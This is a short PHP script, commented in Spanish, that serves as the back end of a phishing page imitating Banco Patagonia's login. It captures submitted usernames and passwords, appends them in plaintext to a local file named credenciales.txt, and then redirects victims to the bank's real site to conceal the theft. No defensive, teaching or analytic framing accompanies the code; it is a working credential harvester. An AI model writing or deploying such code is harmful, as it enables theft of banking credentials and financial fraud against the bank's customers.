<?php
// Obtener los datos del formulario
$username = $_POST['username'];
$password = $_POST['password'];

// Almacenar las credenciales en un archivo
$file = '/home/william/Documentos/credenciales.txt';
file_put_contents($file, "Username: $username, Password: $password\n", FILE_APPEND);

// Redirigir al usuario a la página de login real del Banco Patagonia
header("Location: https://www.bancopatagonia.com.ar/personas/index.php");
exit();
?>
